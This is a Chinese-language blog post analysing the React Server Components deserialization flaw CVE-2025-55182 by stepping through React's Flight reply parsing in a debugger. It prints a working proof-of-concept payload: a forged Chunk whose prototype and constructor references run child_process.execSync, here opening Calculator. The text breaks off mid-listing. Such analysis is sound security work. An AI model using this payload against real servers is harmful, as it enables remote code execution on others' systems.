<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content><title>React2shell_CVE-2025-55182分析</title><link rel=canonical href=https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="React2shell_CVE-2025-55182分析"><meta property='og:description' content><meta property='og:url' content='https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/'><meta property='og:site_name' content="B5juan's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CVEs'><meta property='article:tag' content='React'><meta property='article:published_time' content='2025-12-31T14:15:06+08:00'><meta property='article:modified_time' content='2025-12-31T14:15:06+08:00'><meta property='og:image' content='https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/%E9%84%B1%E9%98%B3%E6%B9%96%E6%A1%A5.jpg'><meta name=twitter:title content="React2shell_CVE-2025-55182分析"><meta name=twitter:description content><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/%E9%84%B1%E9%98%B3%E6%B9%96%E6%A1%A5.jpg'><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/images/fish.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>B5juan's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu id=main-menu><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#0x01-漏洞背景>0x01 漏洞背景</a><ol><li><a href=#11-react-server-component>1.1 React Server Component</a></li><li><a href=#12-flight-协议>1.2 Flight 协议</a></li></ol></li><li><a href=#0x02-漏洞原理>0x02 漏洞原理</a></li><li><a href=#0x03-poc-调试>0x03 POC 调试</a><ol><li><a href=#31-环境准备>3.1 环境准备</a></li><li><a href=#32-注册事件构造初始对象>3.2 注册事件+构造初始对象</a></li><li><a href=#33-解析请求数据>3.3 解析请求数据</a></li><li><a href=#34-then回调>3.4 then回调</a></li><li><a href=#35-valuethen回调>3.5 value.then回调</a></li></ol></li><li><a href=#0x04-利用链梳理>0x04 利用链梳理</a><ol><li><a href=#41-构造假-chunk>4.1 构造假 Chunk</a></li><li><a href=#42-原型链遍历>4.2 原型链遍历</a></li><li><a href=#43-获取构造函数>4.3 获取构造函数</a></li><li><a href=#44-调用恶意函数>4.4 调用恶意函数</a></li></ol></li><li><a href=#0x05-影响范围>0x05 影响范围</a></li><li><a href=#0x06-检测与绕过>0x06 检测与绕过</a><ol><li><a href=#61-可检测特征>6.1 可检测特征</a></li><li><a href=#62-攻击结果检测>6.2 攻击结果检测</a></li><li><a href=#63-payload-绕过>6.3 payload 绕过</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/%E9%84%B1%E9%98%B3%E6%B9%96%E6%A1%A5_hu_a878cf998afc5f45.jpg srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/%E9%84%B1%E9%98%B3%E6%B9%96%E6%A1%A5_hu_a878cf998afc5f45.jpg 800w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/%E9%84%B1%E9%98%B3%E6%B9%96%E6%A1%A5_hu_bc32157070925380.jpg 1600w" width=800 height=599 loading=lazy alt="Featured image of post React2shell_CVE-2025-55182分析"></a></div><div class=article-details><header class=article-category><a href=/categories/security/>Security
</a><a href=/categories/javascript/>JavaScript</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/>React2shell_CVE-2025-55182分析</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Dec 31, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><h2 id=0x01-漏洞背景>0x01 漏洞背景</h2><h3 id=11-react-server-component>1.1 React Server Component</h3><p>React Server Components 是 React 团队在 React 18 实验阶段提出、在 React 19 稳定的新特性。</p><p>简单来讲，RSC 把组件分为<code>Server Component</code> 和 <code>Client Component</code> 两类，所有的传统组件都是 <code>Client Component</code>，<code>Server Component</code> 和前者的区别在于它在服务端而非浏览器端渲染。</p><p>在服务端，<code>Server Component</code> 可以运行复杂逻辑，可以通过网络通信、文件操作等方式直接访问数据源，也可以重复利用重型代码，如各种重量级的包。通过这些特性，RSC 实现了更快的页面加载、更小的 JavaScript 打包大小、更好的用户体验。</p><h3 id=12-flight-协议>1.2 Flight 协议</h3><p>Flight 是 RSC 的核心通信协议，用于在服务器与客户端之间传输组件树信息与渲染指令。</p><p><strong>工作流程</strong></p><ul><li>服务端渲染 RSC，生成组件树的 Flight 流（含类型标记、ID、负载数据）发送给客户端；客户端接收 Flight 流后，解码并重建组件树，与本地客户端组件拼接渲染。</li><li>客户端触发 Server Action 时，将调用信息编码为 Flight Reply 发送至服务端，服务端解析、执行后返回结果。</li></ul><h2 id=0x02-漏洞原理>0x02 漏洞原理</h2><p><strong>概念</strong>：服务端处理 Flight Reply 时，是通过 <code>decodeReply</code> / <code>decodeReplyFromBusboy</code> 函数把来自客户端的 Flight 流反序列化成对应的对象/函数。在这个过程中，React 对于客户端数据没有足够的检验和限制，致使漏洞存在。</p><p><strong>利用</strong>：伪造一个恶意 Chunk 对象，在反序列化过程中触发恶意代码。</p><blockquote><p>「Chunk 对象」是 RSC 协议里最小的“数据块＋状态机”单位：
每行 Flight 流对应一个带 ID 的 Chunk，内部标记 PENDING → RESOLVED → INITIALIZED；服务端边渲染边 flush，客户端收到即按 ID 解析，可独立渲染或等待依赖，实现流式、渐进、可回溯的组件输出。（来自Kimi）</p></blockquote><h2 id=0x03-poc-调试>0x03 POC 调试</h2><h3 id=31-环境准备>3.1 环境准备</h3><p>自定义一个简单 Server，使用底层库 <code>busboy</code> 处理传入数据，然后直接把 Busboy 流传入 <code>decodeReplyFromBusboy()</code>函数处理。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/server_3.png width=627 height=408 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/server_3_hu_88ea942ea484f474.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/server_3_hu_df773e9cbb82b2a2.png 1024w" loading=lazy class=gallery-image data-flex-grow=153 data-flex-basis=368px></p><p>payload 示例：</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/payload_2.png width=1055 height=389 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/payload_2_hu_af42d1dfe58d829e.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/payload_2_hu_156d1a7d360573ee.png 1024w" loading=lazy class=gallery-image data-flex-grow=271 data-flex-basis=650px></p><h3 id=32-注册事件构造初始对象>3.2 注册事件+构造初始对象</h3><p>先跟进<code>decodeReplyFromBusboy()</code>函数。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy.png width=875 height=593 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_hu_17218a762f6bf2f8.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_hu_e705c97fe5a0a913.png 1024w" loading=lazy class=gallery-image data-flex-grow=147 data-flex-basis=354px></p><p>函数接收上述 <code>busbuoyStream</code> 和两个 undefined 值作为参数，并以此为基础通过 <code>createResponse()</code> 函数构建出如下<code>response</code>对象。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createResponse_2.png width=873 height=483 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createResponse_2_hu_7a417172695c9c78.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createResponse_2_hu_754985c5d3261db1.png 1024w" loading=lazy class=gallery-image data-flex-grow=180 data-flex-basis=433px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>// response
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>_bundlerConfig:</span> <span class=err>undefined,</span>
</span></span><span class=line><span class=cl>  <span class=err>_prefix:</span> <span class=nt>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=err>_formData:</span> <span class=err>FormData</span> <span class=err>{</span> <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=err>_chunks:</span> <span class=err>Map(</span><span class=mi>0</span><span class=err>)</span> <span class=p>{</span> <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=err>_closed:</span> <span class=kc>false</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=err>_closedReason:</span> <span class=kc>null</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=err>_temporaryReferences:</span> <span class=err>undefined,</span>
</span></span><span class=line><span class=cl><span class=err>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后为 <code>busbuoyStream</code> 添加三个监听事件，这里只关注 “field” 事件即可。注册完毕之后返回一个由<code>getChunk()</code>函数构建的 <code>Chunk</code> 对象。跟进<code>getChunk()</code>函数：</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_2.png width=651 height=489 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_2_hu_5fbb00bdc9a0b167.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_2_hu_aa2d76ec73676cd7.png 1024w" loading=lazy class=gallery-image data-flex-grow=133 data-flex-basis=319px></p><p>最终返回如下 Chunk 对象：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>// _chunks[0]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>status:</span> <span class=nt>&#34;pending&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=err>value:</span> <span class=err>null,</span>
</span></span><span class=line><span class=cl>  <span class=err>reason:</span> <span class=err>null,</span>
</span></span><span class=line><span class=cl>  <span class=err>_response:</span> <span class=err>${response</span><span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl><span class=err>}</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>由于引用的特性，在该 <code>Chunk</code> 对象包含一个值为变量 <code>response</code> 的_response属性的同时，该 <code>Chunk</code> 对象也被放入了 <code>response</code> 变量的_chunks 属性中，对应的 key 是传入的固定数值 <code>0</code>。</p></blockquote><p>回到 Server，此时把请求数据推给 <code>busboyStream</code>，再 await 调用上述 <code>Chunk</code> 实例。</p><h3 id=33-解析请求数据>3.3 解析请求数据</h3><p>第一次触发 “filed” 事件，上述 <code>response</code> 和请求数据中第一个键值对传入 <code>resolveField()</code>函数，跟进该函数。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_2.png width=1073 height=393 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_2_hu_dbc57fa0693bd387.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_2_hu_8f7c423e081a779e.png 1024w" loading=lazy class=gallery-image data-flex-grow=273 data-flex-basis=655px></p><p><strong>resolveField()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField.png width=1049 height=245 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_hu_e58ea9da5cea298a.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_hu_770ab24d5c8d9056.png 1024w" loading=lazy class=gallery-image data-flex-grow=428 data-flex-basis=1027px></p><p>进入函数体，</p><ul><li>先为 <code>response</code> 对象的_formData属性添加上述键值对作为其第1个元素。</li><li>经过绝对成立的条件判断后，<code>response</code> 对象被重新赋值为自身的_chunks 属性（唯一元素值为上述 <code>_chunks[0]</code>对象的 Map实例）</li><li>局部变量 <code>prefix</code> 被重新赋值为上述 <code>_chunks[0]</code> 对象，随上述请求数据中的键值对传入<code>resolveModelChunk()</code>函数。</li></ul><p><strong>resolveModelChunk()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveModelChunk.png width=987 height=397 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveModelChunk_hu_bfa53282336630bf.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveModelChunk_hu_fba38e2e208babe1.png 1024w" loading=lazy class=gallery-image data-flex-grow=248 data-flex-basis=596px></p><p>跟进<code>resolveModelChunk()</code>函数：经过几个条件判断语句，最终上述<code>_chunks[0]</code>对象 status 属性被重新赋值为" resolved_model"，value 属性被赋值为请求中的 payload，reason 属性被赋值为上述 payload 对应的键名 “0”。</p><p>第1个请求数据字段对应的 <code>Chunk</code> 对象 <code>_chunks[0]</code>已经构建完成。</p><hr style="border:1px dashed #ccc"><p>继续运行，“filed” 事件再次触发，上述 <code>response</code> 和请求数据中第2个键值对传入 <code>resolveField()</code>函数，继续跟进。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_3.png width=1158 height=436 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_3_hu_3b611ef95fe0fe95.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/decodeReplyFromBusboy_3_hu_789a963a9a85eecf.png 1024w" loading=lazy class=gallery-image data-flex-grow=265 data-flex-basis=637px></p><p>还是进入 <strong>resolveField()</strong> 函数，</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_2.png width=1167 height=361 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_2_hu_e9ea1554171c1d79.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/resolveField_2_hu_4bbb4fa8a9145cad.png 1024w" loading=lazy class=gallery-image data-flex-grow=323 data-flex-basis=775px></p><p>与上一轮相同：</p><ul><li>为 <code>response</code> 对象的 _formData 属性添加上述键值对作为其第2个元素。</li><li>经过绝对成立的条件判断后，<code>response</code> 对象被重新赋值为自身的 _chunks 属性（唯一元素值为上述 <code>_chunks[0]</code> 对象的 Map实例）</li><li>因为 response (_chunks)只有一个元素且键是数字 0，所以根据值为 1 的 key 变量取值返回 undefined，跳过<code>resolveModelChunk()</code>函数调用。</li></ul><p>此时，实际只有一个 Chunk 对象被构建，response 对象的 _formData 属性存储了两个字段。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>// _chunks[0]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>status:</span> <span class=nt>&#34;resolved_model&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=err>value:</span> <span class=nt>&#34;{\&#34;then\&#34;:\&#34;$1:__proto__:then\&#34;,\&#34;status\&#34;:\&#34;resolved_model\&#34;,\&#34;reason\&#34;:0,\&#34;value\&#34;:\&#34;{\\\&#34;then\\\&#34;:\\\&#34;$B\\\&#34;}\&#34;,\&#34;_response\&#34;:{\&#34;_prefix\&#34;:\&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;open -a Calculator&#39;);\&#34;,\&#34;_formData\&#34;:{\&#34;get\&#34;:\&#34;$1:constructor:constructor\&#34;}}}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=err>reason:</span> <span class=err>0,</span>
</span></span><span class=line><span class=cl>  <span class=err>_response:</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>    <span class=err>_bundlerConfig:</span> <span class=err>undefined,</span>
</span></span><span class=line><span class=cl>    <span class=err>_prefix:</span> <span class=nt>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_formData:</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>      <span class=err>Symbol:</span> <span class=err>[</span>
</span></span><span class=line><span class=cl>        <span class=err>{name:</span> <span class=err>&#39;0&#39;,</span> <span class=err>value:</span> <span class=err>&#39;{</span><span class=nt>&#34;then&#34;</span><span class=p>:</span><span class=s2>&#34;$1:__proto__:then&#34;</span><span class=p>,</span><span class=nt>&#34;status&#34;</span><span class=p>:</span><span class=s2>&#34;resolve…mData&#34;</span><span class=p>:{</span><span class=nt>&#34;get&#34;</span><span class=p>:</span><span class=s2>&#34;$1:constructor:constructor&#34;</span><span class=p>}}</span><span class=err>}&#39;},</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span><span class=err>name:</span> <span class=err>&#39;1&#39;,</span> <span class=err>value:</span> <span class=err>&#39;</span><span class=nt>&#34;$@abc&#34;</span><span class=err>&#39;</span><span class=p>}</span><span class=err>]</span>
</span></span><span class=line><span class=cl>    <span class=err>},</span>
</span></span><span class=line><span class=cl>    <span class=err>_chunks:</span> <span class=p>{</span><span class=err>0:</span> <span class=err>$Chunk</span><span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_closed:</span> <span class=kc>false</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_closedReason:</span> <span class=kc>null</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_temporaryReferences:</span> <span class=err>undefined,</span>
</span></span><span class=line><span class=cl>  <span class=err>},</span>
</span></span><span class=line><span class=cl>  <span class=p>[[</span><span class=err>Prototype</span><span class=p>]]</span> <span class=err>=</span> <span class=err>Promise,</span>
</span></span><span class=line><span class=cl><span class=err>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=34-then回调>3.4 then回调</h3><p>请求中的两个字段数据解析完毕后，进入 <code>await _chunks[0]</code>。</p><p>而如下图，Chunk 函数通过原型继承了 Promise 函数，并重写了其原型对象中的 then 方法。所以 <code>await _chunks[0]</code> 将触发<code>_chunks[0].then()</code>。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/Chunk_prototype.png width=1228 height=1118 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/Chunk_prototype_hu_a1f866fcf4cbe839.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/Chunk_prototype_hu_54e625a7081a5fd5.png 1024w" loading=lazy class=gallery-image data-flex-grow=109 data-flex-basis=263px></p><p>如上，因为 <code>_chunks[0]</code>的 status 属性等于“resolved_model”，所以进入 <code>initializeModelChunk() </code>函数分支。</p><p><strong>initializeModelChunk()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_2.png width=1031 height=441 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_2_hu_8e9266edc05740e8.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_2_hu_34c4a205879ae3f1.png 1024w" loading=lazy class=gallery-image data-flex-grow=233 data-flex-basis=561px></p><p>声明、赋值几个变量后，<code>_chunks[0]</code>的 <code>status</code> 属性修改为“cyclic”，<code>chunk.reason</code>和<code>chunk.value</code>都修改为 <code>null</code>。而后，response、原 <code>chunk.value</code>进行 JSON 反序列化获得的对象 、<code>chunk.reason</code>的字符串值传入 <code>reviveModel()</code>函数。</p><p><strong>reviveModel()_0</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2.png width=1122 height=775 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_hu_39f298e5e2d71b45.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_hu_6d3833612b14cc7e.png 1024w" loading=lazy class=gallery-image data-flex-grow=144 data-flex-basis=347px></p><p><code>reviveModel</code>函数中，</p><ul><li>如上所述，形参 value 是原<code>chunk.value</code>进行 JSON 反序列化获得的对象，所以进入第2个 if 分支</li><li>因为 <code>response._temporaryReferences</code> 的值原本就是 <code>undefined</code>，所以没有传入新值</li><li>因为如上所述，value 是个普通对象不是 Array，进入 else 分支</li><li>遍历 value 对象的属性，检查属性是否为 value 自身属性后，给 parentObj 重新赋值为“0:then”字符串</li><li>value 变 parent、value[i] 变 value 后，递归调用<code> reviveModel()</code>函数</li></ul><p><strong>reviveModel()_1_1</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>reviveModel</span><span class=p>(</span><span class=nx>response</span><span class=p>,</span> <span class=nx>parentObj</span><span class=p>,</span> <span class=nx>parentKey</span><span class=p>,</span> <span class=nx>value</span><span class=p>,</span> <span class=nx>reference</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>// 五个参数依次排开
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>$response</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>then</span><span class=o>:</span> <span class=s2>&#34;$1:__proto__:then&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>status</span><span class=o>:</span> <span class=s2>&#34;resolved_model&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>reason</span><span class=o>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>value</span><span class=o>:</span> <span class=s2>&#34;{\&#34;then\&#34;:\&#34;$B\&#34;}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>_response</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>_prefix</span><span class=o>:</span> <span class=s2>&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;open -a Calculator&#39;);&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>_formData</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>get</span><span class=o>:</span> <span class=s2>&#34;$1:constructor:constructor&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;then&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;$1:__proto__:then&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;0:then&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>因为 value 是字符串<code>"$1:__proto__:then"</code>，所以直接进入<code>parseModelString()</code>函数，并返回其返回值。跟进该函数。</p><p>运行结果如下图，因为字符“1”没有对应的预置处理方式，经过几个 switch 分支后，value 被去除“$”前缀后一起进入<code>getOutlinedModel()</code>函数。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1.png width=999 height=223 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_hu_2fa0a1f4a62656e0.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_hu_880b545d04f75924.png 1024w" loading=lazy class=gallery-image data-flex-grow=447 data-flex-basis=1075px></p><p><strong>getOutlinedModel()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel.png width=1019 height=337 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_hu_bd88ea3e4b83c51b.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_hu_aad3d45f575e2d27.png 1024w" loading=lazy class=gallery-image data-flex-grow=302 data-flex-basis=725px></p><p>value 传入后根据“:”分割为包含三个元素的数组 reference，reference第一个元素转为数值型赋值给局部变量 id，而后传入 <code>getChunk()</code>函数并把返回值重新复制给 id。</p><p><strong>getChunk()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_3.png width=1013 height=483 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_3_hu_31b4cd0bb37cb716.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_3_hu_c2cc61e27ef3728a.png 1024w" loading=lazy class=gallery-image data-flex-grow=209 data-flex-basis=503px></p><p><code>getChunk()</code>函数中，因为这次传入的 id 值为<code>1</code>，所以也是构造并返回了第二个 Chunk 对象(如下)。同样，这个 Chunk 对象也被放入了 response 对象的_chunks 属性中，对应的 key 值为<code>1</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
